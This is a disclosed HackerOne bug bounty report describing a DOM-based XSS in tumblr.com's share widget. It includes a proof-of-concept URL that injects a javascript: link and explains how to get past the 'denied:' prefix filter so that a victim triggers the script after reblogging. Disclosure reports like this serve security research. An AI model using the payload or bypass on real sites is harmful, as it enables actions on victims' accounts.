# DOM-Based XSS in tumblr.com

## Report Details
- **Report ID**: 882546
- **URL**: https://hackerone.com/reports/882546
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-26T04:00:02.187Z
- **Disclosed**: 2020-07-27T15:24:50.524Z

## Reporter
- **Username**: keer0k
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
# Description
Hi, i just found a XSS that i think it's a valid issue and i think it is in scope this time.

To get the XSS the attacker needs to create a post in tumblr.com using `https://www.tumblr.com/widgets/share/tool?url=https%3A%2F%2Fkeerok.github.io%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension` URL and change the link of click me text to `javascript:alert(document.domain);//https://evil.com/` without the "denied:". 

After post the payload , the victim needs to reblog the post in www.tumblr.com and click in "click me" and  in "open" to open in a new tab the URL, after this, XSS will be triggered.

I also attached a video of the PoC:
{F842750}


# Steps to reproduce
1. go to `https://www.tumblr.com/widgets/share/tool?url=https%3A%2F%2Fkeerok.github.io%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension`
2. remove "denied:" from click me link
3. save the post
4. victim reblog the post
5. click in "click me"
6. click in open (Abrir)
7. XSS will be triggered

## Impact

it is possible to perform malicious actions on the victim's account

## Attachments
- Screen_Recording_2020-05-26_at_00.46.15.mov
